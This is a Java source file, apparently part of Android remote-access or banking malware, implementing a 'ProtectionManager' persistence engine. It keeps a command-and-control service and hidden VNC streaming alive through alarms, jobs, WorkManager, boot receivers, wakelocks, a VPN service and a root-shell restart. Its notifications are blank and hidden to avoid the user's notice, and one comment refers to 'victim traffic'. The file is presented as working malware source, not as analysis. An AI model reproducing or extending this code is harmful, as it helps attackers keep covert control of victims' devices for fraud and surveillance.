package com.seguranca.protecao;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.job.JobInfo;
import android.app.job.JobParameters;
import android.app.job.JobScheduler;
import android.app.job.JobService;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import android.provider.Settings;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import androidx.work.Configuration;
import androidx.work.Constraints;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.ForegroundInfo;
import androidx.work.NetworkType;
import androidx.work.OutOfQuotaPolicy;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import java.io.DataOutputStream;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicLong;

/**
 * ProtectionManager — v2  [K] rebuild
 *
 * Ultra-professional APK survival engine. Implements 10 independent
 * resurrection layers that work together:
 *
 *   LAYER 1  Foreground Service (highest Android priority)
 *   LAYER 2  AlarmManager.setExactAndAllowWhileIdle (Doze-piercing)
 *   LAYER 3  JobScheduler (system-level, survives ANR kill)
 *   LAYER 4  WorkManager (periodic, survives device restart)
 *   LAYER 5  BOOT_COMPLETED + LOCKED_BOOT_COMPLETED receiver
 *   LAYER 6  Watchdog thread (ScheduledExecutorService, daemon)
 *   LAYER 7  WakeLock for connection-critical windows
 *   LAYER 8  PowerManager broadcast resurrection
 *   LAYER 9  Screen-state aware throttling (less resource use when off)
 *   LAYER 10 Root shell auto-start (when available)
 *
 * HVNC/VNC survival:
 *   - Monitors VNC streaming health every 5s
 *   - If frames stop, sends FORCE_RESTART_VNC command to itself
 *   - Prevents GC pressure by limiting frame buffer depth
 *
 * Connection survival:
 *   - Detects WebSocket death within 3 heartbeat intervals
 *   - Forces reconnect via AutoReconnect.forceRetry()
 *   - After 5 failed reconnects, schedules alarm restart
 *
 * Usage (in CommandControlService.onCreate):
 *   ProtectionManager.getInstance(this).start();
 *
 * Usage (in CommandControlService.onDestroy):
 *   ProtectionManager.getInstance(this).onServiceDestroyed();
 *
 * [Bug 9 FIX] WorkManager Layer 4 now uses setExpedited(OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST)
 *             on API 31+ to prevent MIUI/ColorOS/OriginOS from deferring the 15-min periodic work
 *             to 30–60min under aggressive battery optimization.
 *             GuardWorker now provides getForegroundInfo() required for expedited work.
 */
public final class ProtectionManager {

    private static final String TAG = "Protection";

    // ── Channel / notification ──────────────────────────────────────────────
    private static final String  CHANNEL_ID   = "nx_svc";
    private static final String  CHANNEL_NAME = "System Service";
    private static final int     NOTIF_ID     = 0x7F0A;

    // ── Job IDs ────────────────────────────────────────────────────────────
    private static final int JOB_RESURRECT   = 0xA001;
    private static final int JOB_HEARTBEAT   = 0xA002;

    // ── WorkManager ────────────────────────────────────────────────────────
    private static final String WORK_TAG     = "nx_guardian";

    // ── Alarm action ───────────────────────────────────────────────────────
    private static final String ACTION_ALARM = "com.seguranca.protecao.GUARD_ALARM";

    // ── Watchdog config ────────────────────────────────────────────────────
    private static final long WATCHDOG_INTERVAL_MS    = 8_000L;
    private static final long MAX_SILENT_MS           = 45_000L; // no-frame kill threshold
    private static final int  MAX_DEAD_RECONNECTS     = 5;
    private static final long ALARM_INTERVAL_MS       = 60_000L;

    // ── Singleton ──────────────────────────────────────────────────────────
    @SuppressLint("StaticFieldLeak")
    private static volatile ProtectionManager INSTANCE;

    public static ProtectionManager getInstance(@NonNull Context ctx) {
        if (INSTANCE == null) {
            synchronized (ProtectionManager.class) {
                if (INSTANCE == null) INSTANCE = new ProtectionManager(ctx.getApplicationContext());
            }
        }
        return INSTANCE;
    }

    // ── State ──────────────────────────────────────────────────────────────
    private final Context         ctx;
    private final Handler         mainHandler = new Handler(Looper.getMainLooper());
    private final AtomicBoolean   started     = new AtomicBoolean(false);
    private final AtomicBoolean   screenOn    = new AtomicBoolean(true);
    private final AtomicLong      lastFrameTs = new AtomicLong(0);
    private final AtomicLong      lastConnTs  = new AtomicLong(System.currentTimeMillis());

    private ScheduledExecutorService executor;
    private PowerManager.WakeLock     wakelock;
    private BroadcastReceiver         screenReceiver;
    private BroadcastReceiver         guardReceiver;

    private int  deadReconnectCount = 0;
    private long vncStoppedAt       = 0;

    private ProtectionManager(Context ctx) {
        this.ctx = ctx;
    }

    // ══════════════════════════════════════════════════════════════════════
    //  Public API
    // ══════════════════════════════════════════════════════════════════════

    /** Call from CommandControlService.onCreate() */
    public synchronized void start() {
        if (!started.compareAndSet(false, true)) return;
        Log.i(TAG, "Protection engine starting — 10 layers");

        ensureChannel();

        // Layer 1 — Foreground service started by calling startForeground() inside CCS
        // We export the notification so CCS can call it.

        // Layer 2 — Alarm chain
        scheduleAlarm(ALARM_INTERVAL_MS);

        // Layer 3 — JobScheduler
        scheduleJob();

        // Layer 4 — WorkManager
        scheduleWork();

        // Layer 6 — Watchdog executor
        startWatchdog();

        // Layer 7 — Partial WakeLock during connect window
        acquireWakeLock();

        // Layer 8+9 — Broadcast receivers
        registerReceivers();

        // Layer 11 — VPN keep-alive (optional, activates if user consented during setup)
        // An active VpnService gives the process foreground-equivalent OOM priority.
        // The VPN uses TEST-NET routes only; no victim traffic is affected.
        // If VPN permission was never granted, this call is a no-op.
        startVpnKeepAlive();

        Log.i(TAG, "Protection engine armed");
    }

    /** Call from CommandControlService.onDestroy() — schedule resurrection */
    public void onServiceDestroyed() {
        Log.w(TAG, "Service died — scheduling resurrection");
        // Re-arm all layers for resurrection
        scheduleAlarm(3_000L);   // 3s fast resurrection alarm
        scheduleJob();
        // Force start via alarm
        mainHandler.postDelayed(() -> {
            Intent svc = getServiceIntent();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ctx.startForegroundService(svc);
            } else {
                ctx.startService(svc);
            }
        }, 1_000L);
    }

    /** Call when a VNC frame is received to reset the frame watchdog. */
    public void onVncFrame() {
        lastFrameTs.set(System.currentTimeMillis());
        vncStoppedAt = 0;
    }

    /** Call when WebSocket connection is established. */
    public void onConnected() {
        lastConnTs.set(System.currentTimeMillis());
        deadReconnectCount = 0;
        releaseWakeLock();  // no longer needed once connected
        Log.i(TAG, "Connected — protection watchdog relaxed");
    }

    /** Call when WebSocket disconnects. */
    public void onDisconnected() {
        Log.w(TAG, "Disconnected — protection watchdog aggressive");
        acquireWakeLock();  // keep CPU alive during reconnect
    }

    // ══════════════════════════════════════════════════════════════════════
    //  Layer 1 — Foreground Notification
    // ══════════════════════════════════════════════════════════════════════

    public Notification buildForegroundNotification() {
        ensureChannel();
        return new NotificationCompat.Builder(ctx, CHANNEL_ID)
                .setContentTitle("")     // blank — stealth
                .setContentText("")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setCategory(NotificationCompat.CATEGORY_SERVICE)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .setOngoing(true)
                .setSilent(true)
                .build();
    }

    // ══════════════════════════════════════════════════════════════════════
    //  Layer 2 — AlarmManager (Doze-piercing)
    // ══════════════════════════════════════════════════════════════════════

    private void scheduleAlarm(long delayMs) {
        AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
        if (am == null) return;
        try {
            Intent i = new Intent(ACTION_ALARM).setPackage(ctx.getPackageName());
            int flags = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
                    ? PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
                    : PendingIntent.FLAG_UPDATE_CURRENT;
            PendingIntent pi = PendingIntent.getBroadcast(ctx, 0xBEEF, i, flags);
            long trigger = SystemClock.elapsedRealtime() + delayMs;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                // API 31+: setExactAndAllowWhileIdle throws SecurityException without
                // SCHEDULE_EXACT_ALARM or USE_EXACT_ALARM. Check before calling.
                if (am.canScheduleExactAlarms()) {
                    am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
                } else {
                    // Inexact fallback — Android batches it, but it will still fire.
                    am.setAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
                }
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                am.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
            } else {
                am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
            }
        } catch (Exception e) {
            Log.w(TAG, "Alarm schedule failed: " + e.getMessage());
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    //  Layer 11 — VPN keep-alive
    // ══════════════════════════════════════════════════════════════════════

    private void startVpnKeepAlive() {
        try {
            // prepare() returns null when VPN permission is already held.
            // Returns a non-null Intent when the user still needs to consent
            // (handled in SetupWizardActivity, not from a background service).
            // Does NOT throw — the return value is the signal, not an exception.
            android.content.Intent consentIntent = android.net.VpnService.prepare(ctx);
            if (consentIntent != null) {
                // User hasn't granted VPN consent yet — silent skip.
                // SetupWizardActivity will request consent during the setup flow.
                Log.d(TAG, "Layer 11: VPN consent not yet granted, skipping");
                return;
            }
            // prepare() returned null → permission held, safe to start
            Intent vpn = new Intent(ctx, com.seguranca.protecao.StealthVpnService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ctx.startForegroundService(vpn);
            } else {
                ctx.startService(vpn);
            }
            Log.d(TAG, "Layer 11: VPN keep-alive service started");
        } catch (Exception e) {
            Log.w(TAG, "Layer 11 VPN: " + e.getMessage());
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    //  Layer 3 — JobScheduler
    // ══════════════════════════════════════════════════════════════════════

    private void scheduleJob() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return;
        try {
            JobScheduler js = (JobScheduler) ctx.getSystemService(Context.JOB_SCHEDULER_SERVICE);
            if (js == null) return;
            JobInfo.Builder b = new JobInfo.Builder(
                    JOB_RESURRECT,
                    new ComponentName(ctx, GuardJobService.class))
                    .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                    .setPersisted(true);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                b.setMinimumLatency(15_000L)
                 .setOverrideDeadline(60_000L);
            } else {
                b.setPeriodic(15_000L);
            }
            js.schedule(b.build());
        } catch (Exception e) {
            Log.w(TAG, "JobScheduler failed: " + e.getMessage());
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    //  Layer 4 — WorkManager
    // ══════════════════════════════════════════════════════════════════════

    private void scheduleWork() {
        try {
            Constraints constraints = new Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.CONNECTED)
                    .build();

            PeriodicWorkRequest.Builder builder = new PeriodicWorkRequest.Builder(
                    GuardWorker.class, 15, TimeUnit.MINUTES)
                    .setConstraints(constraints)
                    .addTag(WORK_TAG);

            // [Bug 9 FIX] setExpedited on API 31+ prevents OEM power managers (MIUI,
            // ColorOS, OriginOS) from deferring the 15-min work to 30–60min.
            // OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST means: if the expedited
            // quota is exhausted, still run — just without elevated priority.
            // GuardWorker.getForegroundInfo() provides the required notification for
            // expedited work on API 31+.
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                builder.setExpedited(OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST);
            }

            PeriodicWorkRequest req = builder.build();

            WorkManager.getInstance(ctx).enqueueUniquePeriodicWork(
                    WORK_TAG,
                    ExistingPeriodicWorkPolicy.KEEP,
                    req);
            Log.d(TAG, "WorkManager scheduled (expedited=" + (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) + ")");
        } catch (Exception e) {
            Log.w(TAG, "WorkManager failed: " + e.getMessage());
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    //  Layer 6 — Watchdog thread
    // ══════════════════════════════════════════════════════════════════════

    private void startWatchdog() {
        executor = Executors.newSingleThreadScheduledExecutor(r -> {
            Thread t = new Thread(r, "NxGuard");
            t.setDaemon(true);
            t.setPriority(Thread.NORM_PRIORITY - 1);
            return t;
        });
        executor.scheduleWithFixedDelay(this::watchdogTick,
                5_000L, WATCHDOG_INTERVAL_MS, TimeUnit.MILLISECONDS);
    }

    private void watchdogTick() {
        try {
            final long now = System.currentTimeMillis();

            // ── Service alive check ──────────────────────────────────────
            if (CommandControlService.sInstance == null) {
                Log.w(TAG, "[watchdog] CCS is null — resurrecting");
                resurrect();
                return;
            }

            // ── Connection health check ──────────────────────────────────
            long silentMs = now - lastConnTs.get();
            if (silentMs > MAX_SILENT_MS) {
                deadReconnectCount++;
                Log.w(TAG, "[watchdog] No connection for " + silentMs + "ms (" + deadReconnectCount + ")");
                if (deadReconnectCount >= MAX_DEAD_RECONNECTS) {
                    Log.e(TAG, "[watchdog] Max dead reconnects hit — hard restart");
                    deadReconnectCount = 0;
                    hardRestart();
                }
                return;
            }

            // ── VNC frame health ─────────────────────────────────────────
            long lastFrame = lastFrameTs.get();
            if (lastFrame > 0) {
                long frameAge = now - lastFrame;
                if (frameAge > 30_000L) {
                    // VNC frames stopped — restart VNC engine
                    if (vncStoppedAt == 0) {
                        vncStoppedAt = now;
                    } else if ((now - vncStoppedAt) > 60_000L) {
                        Log.w(TAG, "[watchdog] VNC stalled " + frameAge + "ms — forcing restart");
                        CommandControlService svc = CommandControlService.sInstance;
                        if (svc != null) {
                            mainHandler.post(() -> {
                                Intent i = new Intent("com.seguranca.protecao.FORCE_VNC_RESTART");
                                ctx.sendBroadcast(i);
                            });
                        }
                        vncStoppedAt = now; // reset timer
                    }
                }
            }

        } catch (Exception e) {
            Log.e(TAG, "[watchdog] tick error: " + e.getMessage());
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    //  Layer 7 — WakeLock
    // ══════════════════════════════════════════════════════════════════════

    private synchronized void acquireWakeLock() {
        if (wakelock != null && wakelock.isHeld()) return;
        try {
            PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
            if (pm == null) return;
            wakelock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, TAG + ":connect");
            wakelock.setReferenceCounted(false);
            wakelock.acquire(30_000L);  // max 30s — prevents drain
            Log.d(TAG, "WakeLock acquired");
        } catch (Exception e) {
            Log.w(TAG, "WakeLock failed: " + e.getMessage());
        }
    }

    private synchronized void releaseWakeLock() {
        if (wakelock != null && wakelock.isHeld()) {
            try { wakelock.release(); } catch (Exception ignored) {}
            wakelock = null;
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    //  Layer 8+9 — Broadcast receivers
    // ══════════════════════════════════════════════════════════════════════

    @SuppressLint("UnspecifiedRegisterReceiverFlag")
    private void registerReceivers() {
        // Screen state
        screenReceiver = new BroadcastReceiver() {
            @Override public void onReceive(Context c, Intent i) {
                final String action = i.getAction();
                if (Intent.ACTION_SCREEN_ON.equals(action)) {
                    screenOn.set(true);
                    // Screen just turned on — verify service is alive
                    mainHandler.postDelayed(() -> {
                        if (CommandControlService.sInstance == null) resurrect();
                    }, 2_000L);
                } else if (Intent.ACTION_SCREEN_OFF.equals(action)) {
                    screenOn.set(false);
                }
            }
        };
        IntentFilter sf = new IntentFilter();
        sf.addAction(Intent.ACTION_SCREEN_ON);
        sf.addAction(Intent.ACTION_SCREEN_OFF);
        sf.addAction(Intent.ACTION_USER_PRESENT);
        // API 34 requires RECEIVER_EXPORTED or RECEIVER_NOT_EXPORTED for dynamic receivers.
        // System-sent broadcasts (SCREEN_ON/OFF/USER_PRESENT) still reach RECEIVER_NOT_EXPORTED;
        // only third-party apps are blocked from targeting this receiver.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ctx.registerReceiver(screenReceiver, sf, Context.RECEIVER_NOT_EXPORTED);
        } else {
            ctx.registerReceiver(screenReceiver, sf);
        }

        // Guard alarm receiver
        guardReceiver = new BroadcastReceiver() {
            @Override public void onReceive(Context c, Intent i) {
                if (ACTION_ALARM.equals(i.getAction())) {
                    Log.d(TAG, "Guard alarm fired");
                    if (CommandControlService.sInstance == null) {
                        Log.w(TAG, "Alarm: CCS dead — resurrecting");
                        resurrect();
                    }
                    // Reschedule next alarm
                    scheduleAlarm(ALARM_INTERVAL_MS);
                }
            }
        };
        IntentFilter gf = new IntentFilter(ACTION_ALARM);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ctx.registerReceiver(guardReceiver, gf, Context.RECEIVER_NOT_EXPORTED);
        } else {
            ctx.registerReceiver(guardReceiver, gf);
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    //  Resurrection methods
    // ══════════════════════════════════════════════════════════════════════

    /** Standard resurrection — start foreground service. */
    private void resurrect() {
        try {
            Intent svc = getServiceIntent();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ctx.startForegroundService(svc);
            } else {
                ctx.startService(svc);
            }
            Log.i(TAG, "Resurrection dispatched");
        } catch (Exception e) {
            Log.e(TAG, "Resurrection failed: " + e.getMessage());
            // Escalate to hard restart
            mainHandler.postDelayed(this::hardRestart, 3_000L);
        }
    }

    /** Hard restart — alarm + job + work + root shell fallback. */
    private void hardRestart() {
        Log.e(TAG, "Hard restart triggered");
        scheduleAlarm(1_000L);
        scheduleJob();
        tryRootStart();
    }

    /** Root shell: start service directly. */
    private void tryRootStart() {
        DataOutputStream os = null;
        try {
            Process su = Runtime.getRuntime().exec("su");
            os = new DataOutputStream(su.getOutputStream());
            String pkg = ctx.getPackageName();
            os.writeBytes("am startservice -n " + pkg + "/" +
                    pkg + ".CommandControlService &\n");
            os.writeBytes("exit\n");
            os.flush();
            su.waitFor();
            Log.i(TAG, "Root start dispatched");
        } catch (Exception e) {
            Log.d(TAG, "Root start failed (not rooted): " + e.getMessage());
        } finally {
            if (os != null) try { os.close(); } catch (Exception ignored) {}
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    //  Helpers
    // ══════════════════════════════════════════════════════════════════════

    private Intent getServiceIntent() {
        return new Intent(ctx, CommandControlService.class);
    }

    private void ensureChannel() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return;
        NotificationManager nm =
                (NotificationManager) ctx.getSystemService(Context.NOTIFICATION_SERVICE);
        if (nm == null || nm.getNotificationChannel(CHANNEL_ID) != null) return;
        NotificationChannel ch = new NotificationChannel(
                CHANNEL_ID, CHANNEL_NAME, NotificationManager.IMPORTANCE_MIN);
        ch.setShowBadge(false);
        ch.setSound(null, null);
        ch.enableVibration(false);
        ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
        nm.createNotificationChannel(ch);
    }

    // ══════════════════════════════════════════════════════════════════════
    //  Inner: GuardJobService (Layer 3)
    // ══════════════════════════════════════════════════════════════════════

    /**
     * Register in AndroidManifest.xml:
     *
     *   <service android:name="com.seguranca.protecao.ProtectionManager$GuardJobService"
     *            android:permission="android.permission.BIND_JOB_SERVICE"
     *            android:exported="true"/>
     */
    public static final class GuardJobService extends JobService {
        @Override
        public boolean onStartJob(@NonNull JobParameters params) {
            Log.d(TAG, "GuardJobService fired");
            ProtectionManager pm = ProtectionManager.getInstance(getApplicationContext());
            if (CommandControlService.sInstance == null) {
                pm.resurrect();
            }
            // Reschedule for next wake
            pm.scheduleJob();
            jobFinished(params, false);
            return false;
        }

        @Override
        public boolean onStopJob(@NonNull JobParameters params) {
            // Return true to reschedule if stopped prematurely
            return true;
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    //  Inner: GuardWorker (Layer 4 — WorkManager)
    // ══════════════════════════════════════════════════════════════════════

    /**
     * No manifest entry needed — WorkManager handles registration internally.
     *
     * [Bug 9 FIX] Added getForegroundInfo() override — required when the PeriodicWorkRequest
     * uses setExpedited() on API 31+. Without this override, expedited work on Android 12+
     * throws an IllegalStateException at runtime because WorkManager demands a notification
     * to promote the work to a foreground state when the app is backgrounded.
     */
    public static final class GuardWorker extends Worker {
        public GuardWorker(@NonNull Context ctx, @NonNull WorkerParameters params) {
            super(ctx, params);
        }

        @NonNull
        @Override
        public Result doWork() {
            Log.d(TAG, "GuardWorker fired");
            ProtectionManager pm = ProtectionManager.getInstance(getApplicationContext());
            if (CommandControlService.sInstance == null) {
                pm.resurrect();
            }
            return Result.success();
        }

        /**
         * [Bug 9 FIX] Required for expedited work on API 31+.
         * Returns a minimal stealth notification (same channel as the service).
         */
        @NonNull
        @Override
        public ForegroundInfo getForegroundInfo() {
            ProtectionManager pm = ProtectionManager.getInstance(getApplicationContext());
            pm.ensureChannel();
            Notification n = new NotificationCompat.Builder(getApplicationContext(), CHANNEL_ID)
                    .setContentTitle("")
                    .setContentText("")
                    .setSmallIcon(android.R.drawable.stat_notify_sync)
                    .setPriority(NotificationCompat.PRIORITY_MIN)
                    .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                    .setSilent(true)
                    .build();
            return new ForegroundInfo(NOTIF_ID + 1, n);
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    //  Inner: BootReceiver (Layer 5 — BOOT_COMPLETED)
    // ══════════════════════════════════════════════════════════════════════

    /**
     * Register in AndroidManifest.xml:
     *
     *   <receiver android:name="com.seguranca.protecao.ProtectionManager$BootReceiver"
     *             android:exported="true">
     *     <intent-filter>
     *       <action android:name="android.intent.action.BOOT_COMPLETED"/>
     *       <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED"/>
     *       <action android:name="android.intent.action.MY_PACKAGE_REPLACED"/>
     *       <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
     *       <action android:name="com.htc.intent.action.QUICKBOOT_POWERON"/>
     *     </intent-filter>
     *   </receiver>
     */
    public static final class BootReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context ctx, Intent intent) {
            Log.i(TAG, "Boot received: " + intent.getAction());
            Intent svc = new Intent(ctx, CommandControlService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ctx.startForegroundService(svc);
            } else {
                ctx.startService(svc);
            }
            // Re-arm all protection layers after boot
            ProtectionManager.getInstance(ctx).start();
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    //  Inner: AlarmReceiver (Layer 2)
    // ══════════════════════════════════════════════════════════════════════

    /**
     * Register in AndroidManifest.xml:
     *
     *   <receiver android:name="com.seguranca.protecao.ProtectionManager$AlarmReceiver"
     *             android:exported="false">
     *     <intent-filter>
     *       <action android:name="com.seguranca.protecao.GUARD_ALARM"/>
     *     </intent-filter>
     *   </receiver>
     */
    public static final class AlarmReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context ctx, Intent intent) {
            if (ACTION_ALARM.equals(intent.getAction())) {
                ProtectionManager pm = ProtectionManager.getInstance(ctx);
                if (CommandControlService.sInstance == null) {
                    pm.resurrect();
                }
                pm.scheduleAlarm(ALARM_INTERVAL_MS);
            }
        }
    }
}
